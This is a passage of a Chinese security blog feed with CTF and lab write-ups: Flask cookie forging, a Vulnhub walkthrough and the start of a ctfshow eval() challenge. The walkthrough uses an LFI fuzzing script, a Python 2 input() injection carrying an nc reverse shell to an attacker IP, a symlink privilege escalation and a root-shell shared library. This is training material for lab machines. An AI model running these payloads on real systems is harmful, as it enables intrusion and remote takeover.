class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@VM-<span class="hljs-number">24</span>-<span class="hljs-number">13</span>-debian:/opt/flask-session-cookie-manager# python<span class="hljs-number">3</span> flask_session_cookie_manager<span class="hljs-number">3</span>.py decode -c &#x27;eyJ<span class="hljs-number">1</span>c<span class="hljs-number">2</span>VybmFtZSI<span class="hljs-number">6</span>eyIgYiI<span class="hljs-number">6</span>ImQzZDNMV<span class="hljs-number">1</span>JoZEdFPSJ<span class="hljs-number">9</span>fQ.YfqSEA.NPXmEcGUHLoZzUaHtVIRL<span class="hljs-number">2</span>zywNk&#x27;<br><span class="hljs-attribute">b</span>&#x27;&#123;<span class="hljs-string">&quot;username&quot;</span>:&#123;<span class="hljs-string">&quot; b&quot;</span>:<span class="hljs-string">&quot;d3d3LWRhdGE=&quot;</span>&#125;&#125;&#x27;<br><br><span class="hljs-attribute">root</span>@VM-<span class="hljs-number">24</span>-<span class="hljs-number">13</span>-debian:/opt/flask-session-cookie-manager# python<span class="hljs-number">3</span> flask_session_cookie_manager<span class="hljs-number">3</span>.py encode -t &#x27;&#123;<span class="hljs-string">&quot;username&quot;</span>:&#123;<span class="hljs-string">&quot; b&quot;</span>:<span class="hljs-string">&quot;cm9vdA==&quot;</span>&#125;&#125;&#x27;  -s &#x27;<span class="hljs-number">82</span>.<span class="hljs-number">56599527038603</span>&#x27;<br><span class="hljs-attribute">eyJ1c2VybmFtZSI6eyIgZGkiOnsiIGJfXyI6ImNtOXZkQT09In19fQ</span>.YfqVWg.cNyImoM<span class="hljs-number">85</span>WxXWDX<span class="hljs-number">3</span>z<span class="hljs-number">3</span>KG<span class="hljs-number">33</span>wK<span class="hljs-number">2</span>qk<br></code></pre></td></tr></table></figure><p>然后替换session就行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CTF" scheme="https://d3n13d.github.io/categories/CTF/"/>
    
    
    <category term="Web" scheme="https://d3n13d.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub-bottleneck</title>
    <link href="https://d3n13d.github.io/2022/01/30/Vulnhub-bottleneck/"/>
    <id>https://d3n13d.github.io/2022/01/30/Vulnhub-bottleneck/</id>
    <published>2022-01-30T02:02:24.000Z</published>
    <updated>2022-01-30T02:06:03.828Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01:前言"></a>0x01:前言</h2><p>好久之前做的觉得还不错，今天给它发出来见见光</p><h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02:信息收集"></a>0x02:信息收集</h2><p>判断目标机器Ip为    192.168.1.53</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956986.png" alt="img"></p><p>几个扫描结果</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956264.png" alt="img"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956798.png" alt="img"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956637.png" alt="img"></p><p>得到的目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs plain">/css<br>/index.php<br>/js<br>/image_gallery.php<br>/img<br></code></pre></td></tr></table></figure><p>主页的提示，并没有什么用</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956810.png" alt="img"></p><h2 id="0x02-LFI漏洞利用"><a href="#0x02-LFI漏洞利用" class="headerlink" title="0x02:LFI漏洞利用"></a>0x02:LFI漏洞利用</h2><p>在  &#x2F;image_gallery.php 中</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956347.png" alt="img"></p><p>发现图片存在 t 和 f 这两个参数，猜测可能对应单词 time 和  file ,随后我尝试刷新</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201301000447.png" alt="img"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201301000678.png" alt="img"></p><p>两个数字还挺像的对吧 …(生硬了</p><p>尝试burp重新发包 读取 &#x2F;root&#x2F;flag.txt   麻了，后来看了看别的老哥walkthrough 好多读&#x2F;etc&#x2F;passwd  记一下记一下</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300955883.png" alt="img"></p><p>没有返回内容，emmm，试试脚本弥补手速的缺陷？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> time<br><br>url=<span class="hljs-string">&quot;http://192.168.1.53/image_gallery.php&quot;</span><br>r=requests.get(url=url)<br>res=r.text<br>dtime=datetime.datetime.now()<br>t=<span class="hljs-built_in">int</span>(time.mktime(dtime.timetuple()))<br>filename=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C:\\Users\\16476\\Desktop\\fuzz.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> filename.read().splitlines():<br>    word=line.strip(<span class="hljs-string">&quot;\r&quot;</span>).strip(<span class="hljs-string">&quot;\n&quot;</span>)<br>    payload = base64.b64encode(word.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    <span class="hljs-built_in">print</span>(payload)<br>    <span class="hljs-keyword">try</span>:<br>        params=&#123;<br>            <span class="hljs-string">&#x27;t&#x27;</span>:t,<br>            <span class="hljs-string">&#x27;f&#x27;</span>:payload<br>        &#125;<br>        r1=requests.get(url=url,params=params)<br>        <span class="hljs-built_in">print</span>(r1.request.url)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;----------------start verify-&quot;</span>+word+<span class="hljs-string">&quot;--------------&quot;</span>)<br>        res=r1.text<br>        <span class="hljs-built_in">print</span>(res)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300955066.png" alt="img"></p><p>可以发现我们的请求被扔进了垃圾桶 ，这次时间应该是没啥问题 那问题可能出在文件名上？尝试读取..&#x2F;image_gallery.php的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">CHANGELOG</span><br><span class="hljs-comment">v1.1: Still testing without content.</span><br><span class="hljs-comment">    I&#x27;ve fixed that problem that <span class="hljs-doctag">@p</span>4w and <span class="hljs-doctag">@ska</span> notified me after hacker attack.</span><br><span class="hljs-comment">    Shit I&#x27;m too lazy to make a big review of my code.</span><br><span class="hljs-comment">    I think that the LFI problem can be mitigated with the blacklist.</span><br><span class="hljs-comment">    By the way to protect me from attackers, all malicious requests are immediately sent to the SOC</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">v1.0: Starting this beautiful gallery</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$tstamp</span> = time();<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;image_gallery_load.php&#x27;</span>;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>又发现个文件名 image_gallery_load.php 继续尝试获取源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">print_troll</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$messages</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;messages&#x27;</span>];<br>    <span class="hljs-variable">$troll</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;troll&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$messages</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$troll</span>;<br>&#125;<br><br><span class="hljs-variable">$troll</span> = <span class="hljs-string">&lt;&lt;&lt;EOT</span><br><span class="hljs-string">&lt;pre&gt;</span><br><span class="hljs-string">                                   _,..._</span><br><span class="hljs-string">                                  /__    \</span><br><span class="hljs-string">                                   &gt;&lt; `.  \</span><br><span class="hljs-string">                                  /_    \ |</span><br><span class="hljs-string">                                   \-_  /:|</span><br><span class="hljs-string">                                 ,--&#x27;..&#x27;. :</span><br><span class="hljs-string">                               ,&#x27;         `.</span><br><span class="hljs-string">                            _,&#x27;             \</span><br><span class="hljs-string">                   _.._,--&#x27;&#x27;    ,           |</span><br><span class="hljs-string">               , ,&#x27;,, _|    _,.&#x27;|      |    |</span><br><span class="hljs-string">            \\||/,&#x27;(,&#x27; &#x27;--&#x27;&#x27;    |      |    |</span><br><span class="hljs-string">       _     |||                |      /-&#x27;  |</span><br><span class="hljs-string">      | |   (- -)&lt;`._           |     /    /</span><br><span class="hljs-string">      | |  \_\O/_/`-.(&lt;&lt;        |____/    /</span><br><span class="hljs-string">      | |   /   \              / -&#x27;| `--.&#x27;|</span><br><span class="hljs-string">      | |   \___/             /           /</span><br><span class="hljs-string">      | |    H H             /     |     |</span><br><span class="hljs-string">      |_|_..-H-H--.._       /     ,|     |</span><br><span class="hljs-string">        |-.._&quot;_&quot;__..-|     |   _-/ |     |</span><br><span class="hljs-string">        |            |     |    |   \_   |</span><br><span class="hljs-string">        |            |     |    |   |    |</span><br><span class="hljs-string">        |            |     |____|   |    |</span><br><span class="hljs-string">        |            |  _..&#x27;    |   |____|</span><br><span class="hljs-string">        |            |_(____..._&#x27; _.&#x27;    |</span><br><span class="hljs-string">        `-..______..-&#x27;&quot;&quot;         (___..--&#x27;</span><br><span class="hljs-string">&lt;pre&gt;</span><br><span class="hljs-string">EOT</span>;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$imagefile</span> = base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>]);<br><span class="hljs-variable">$timestamp</span> = time();<br><span class="hljs-variable">$isblocked</span> = <span class="hljs-literal">FALSE</span>;<br><span class="hljs-variable">$blacklist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;/etc&#x27;</span>,<span class="hljs-string">&#x27;/opt&#x27;</span>,<span class="hljs-string">&#x27;/var&#x27;</span>,<span class="hljs-string">&#x27;/opt&#x27;</span>,<span class="hljs-string">&#x27;/proc&#x27;</span>,<span class="hljs-string">&#x27;/dev&#x27;</span>,<span class="hljs-string">&#x27;/lib&#x27;</span>,<span class="hljs-string">&#x27;/bin&#x27;</span>,<span class="hljs-string">&#x27;/usr&#x27;</span>,<span class="hljs-string">&#x27;/home&#x27;</span>,<span class="hljs-string">&#x27;/ids&#x27;</span>);<br><span class="hljs-variable">$messages</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\nLet me throw away your nice request into the bin.\n&quot;</span>.<br>    <span class="hljs-string">&quot;The SOC was informed about your attempt to break into this site. Thanks to previous attackers effort in smashing my </span><br><span class="hljs-string">infrastructructure I will take strong legal measures.\n&quot;</span>.<br>    <span class="hljs-string">&quot;Why don&#x27;t you wait on your chair until someone (maybe the police) knock on your door?\n\n&quot;</span>);<br><br><span class="hljs-keyword">if</span>(abs(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>] - <span class="hljs-variable">$timestamp</span>) &gt; <span class="hljs-number">10</span>)&#123;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$elem</span>)&#123;<br>    <span class="hljs-keyword">if</span>(strstr(<span class="hljs-variable">$imagefile</span>, <span class="hljs-variable">$elem</span>) !== <span class="hljs-literal">FALSE</span>)<br>        <span class="hljs-variable">$isblocked</span> = <span class="hljs-literal">TRUE</span>;<br>&#125;<br><span class="hljs-comment">// report the intrusion to the soc and save information locally for further investigation</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$isblocked</span>)&#123;<br>    <span class="hljs-variable">$logfile</span> = <span class="hljs-string">&#x27;intrusion_&#x27;</span>.<span class="hljs-variable">$timestamp</span>;<br>    <span class="hljs-variable">$fp</span> = fopen(<span class="hljs-string">&#x27;/var/log/soc/&#x27;</span>.<span class="hljs-variable">$logfile</span>, <span class="hljs-string">&#x27;w&#x27;</span>);<br>    fwrite(<span class="hljs-variable">$fp</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-variable">$imagefile</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>);<br>    fclose(<span class="hljs-variable">$fp</span>);<br>    exec(<span class="hljs-string">&#x27;python /opt/ids_strong_bvb.py &lt;/var/log/soc/&#x27;</span>.<span class="hljs-variable">$logfile</span>.<span class="hljs-string">&#x27; &gt;/tmp/output 2&gt;&amp;1&#x27;</span>);<br>    print_troll();<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br>chdir(<span class="hljs-string">&#x27;img&#x27;</span>);                                                                                                                                                <br><span class="hljs-variable">$filecontent</span> = file_get_contents(<span class="hljs-variable">$imagefile</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$filecontent</span> === <span class="hljs-literal">FALSE</span>)&#123;<br>    print_troll();<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$filecontent</span>;<br>&#125;<br>chdir(<span class="hljs-string">&#x27;../&#x27;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到上面的源码 对读取的文件名，和时间只差做了防护,同时我们也可以知道当有黑名单内容时，相关内容会被输出到日志内</p><h2 id="0x03-python2-input-漏洞利用"><a href="#0x03-python2-input-漏洞利用" class="headerlink" title="0x03:python2 input()漏洞利用"></a>0x03:python2 input()漏洞利用</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12605103/1617985123301-6eb1c53c-5b60-41db-b275-f1935ce47949.png" alt="img">知识盲区了</p><p>链接：<a href="https://blog.51cto.com/u_12332766/2299894">https://blog.51cto.com/u_12332766/2299894</a></p><p><a href="https://www.cnblogs.com/heycomputer/articles/10537633.html">https://www.cnblogs.com/heycomputer/articles/10537633.html</a></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300955846.png" alt="img"></p><p>raw_input()比input()更安全的原因是raw_input(完全默认为str字符串类型而input()此函数会将stdin输入的内容当做python代码去执行,类似eval()</p><p>构建</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> urllib<br><br>url=<span class="hljs-string">&quot;http://192.168.1.53/image_gallery.php&quot;</span><br>t=time.time()<br>payload=<span class="hljs-string">&#x27;&#x27;&#x27;/etc&#x27; and __import__(&quot;os&quot;).system(&quot;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.114.128 2333 &gt;/tmp/f&quot;) and\&#x27;&#x27;&#x27;&#x27;</span><br>payload1=base64.b64encode(payload.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>params=&#123;<br>    <span class="hljs-string">&#x27;t&#x27;</span>:t,<br>    <span class="hljs-string">&#x27;f&#x27;</span>:payload1<br>&#125;<br>res=requests.get(url=url,params=params)<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure><p>同时本机监听 4444 端口</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956277.png" alt="img"></p><h2 id="0x04-权限提升"><a href="#0x04-权限提升" class="headerlink" title="0x04:权限提升"></a>0x04:权限提升</h2><p>检查一下sudo的配置情况</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956898.png" alt="img"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956051.png" alt="img"></p><p>发现 clear_logs 指向了&#x2F;opt&#x2F;下的同名脚本，而www-data这个用户对clear_logs有完全控制的权限。但是要想以root权限运行还得切换到bytevsbyte这个用户下</p><p>所以现在大概的思路就是 切换到bytevsbyte用户 并修改clear_logs的指向，指向我们自己的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">cd /tmp/<br>echo &quot;/bin/bash&quot; &gt; test.sh<br>chmod 777 test.sh<br> ln -snf /tmp/test.sh /var/www/html/web_utils/clear_logs #-s 软链接 (符号链接) -n 把符号链接视为一般目录 -f 强制执行<br></code></pre></td></tr></table></figure><p>这个时候访问 bytevsbytes的家目录就可以看到flag</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956597.png" alt="img"></p><p>这个靶机还有一个flag 需要提权为root…</p><p>重新检查suid</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956956.png" alt="img"></p><p>发现这里有个testlib </p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201301001384.png" alt="img"></p><p>查看testlib.c </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;dlfcn.h&gt;</span>        <span class="hljs-comment">//调用动态链接库的头文件</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span>     <span class="hljs-comment">//unistd.h为Linux/Unix系统中内置头文件</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span>&#123;<br>    <span class="hljs-keyword">void</span> *handle;<br>    <span class="hljs-keyword">int</span> (*function)();    <br>    <span class="hljs-keyword">if</span>(argc &lt; <span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    handle = dlopen(argv[<span class="hljs-number">1</span>], RTLD_LAZY);   <span class="hljs-comment">//RTLD_LAZY:在dlopen返回前，对于动态库中存在的未定义的变量(如外部变量extern，也可以是函数)不执行解析，就是不解析这个变量的地址</span><br>    function = dlsym(handle, <span class="hljs-string">&quot;test_this&quot;</span>);  <span class="hljs-comment">//dlsym功能是根据动态链接库操作句柄与符号，返回符号对应的地址，不但可以获取函数地址，也可以获取变量地址</span><br>    function();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;  <br><span class="hljs-comment">//dlopen，打开一个库，并为使用该库做些准备.dlsym，在打开的库中查找符号的值   所以上面这个大概就是调用动态链接库的事情？</span><br></code></pre></td></tr></table></figure><p>set-root-shell:<a href="https://github.com/jivoi/pentest/blob/master/shell/rootshell.c">https://github.com/jivoi/pentest/blob/master/shell/rootshell.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test_this</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>setuid(<span class="hljs-number">0</span>); setgid(<span class="hljs-number">0</span>); system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-comment">//payload.c</span><br></code></pre></td></tr></table></figure><p>这里因为靶机上没有gcc，所以在攻击机上编译好然后http服务一开传过去就好</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">gcc -fPIC -shared payload.c -o payload.so<br></code></pre></td></tr></table></figure><p>下图第一步就等于调用我们传过的函数库，都没注意 下次直接bash<img src="https://cdn.nlark.com/yuque/0/2021/png/12605103/1618077074293-dbe6ec87-3d11-48fa-aa5b-65b0961aa8d6.png" alt="img"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956237.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="靶机" scheme="https://d3n13d.github.io/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
    <category term="Web" scheme="https://d3n13d.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow _新春欢乐赛 热身题的发散思维</title>
    <link href="https://d3n13d.github.io/2022/01/29/ctfshow%20_%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B%20%E7%83%AD%E8%BA%AB%E9%A2%98%E7%9A%84%E5%8F%91%E6%95%A3%E6%80%9D%E7%BB%B4/"/>
    <id>https://d3n13d.github.io/2022/01/29/ctfshow%20_%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B%20%E7%83%AD%E8%BA%AB%E9%A2%98%E7%9A%84%E5%8F%91%E6%95%A3%E6%80%9D%E7%BB%B4/</id>
    <published>2022-01-29T06:42:42.000Z</published>
    <updated>2022-01-29T07:07:45.844Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ctfshow-新春欢乐赛-热身题的发散思维"><a href="#ctfshow-新春欢乐赛-热身题的发散思维" class="headerlink" title="ctfshow _新春欢乐赛 热身题的发散思维"></a>ctfshow _新春欢乐赛 热身题的发散思维</h1><p>打开环境，源码一目了然</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2022-01-16 15:42:02</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2022-01-24 22:14:02</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>这里有个h1xa的小设计，可以看到代码里没有 highlight_file，源码为什么会自己高亮显示？原因很简单因为有auto_append这类预加载文件</p><p>本文尝试用多个解法</p><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p>因为预加载文件会把那个文件的里定义的变量加载到当前文件的变量表里，所以可以有</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291201525.png" alt="image-20220129120114450"></p><h3 id="x2F-proc-x2F-文件目录获取flag"><a href="#x2F-proc-x2F-文件目录获取flag" class="headerlink" title="&#x2F;proc&#x2F;文件目录获取flag"></a>&#x2F;proc&#x2F;文件目录获取flag</h3><p><code>?f=system(&quot;ls 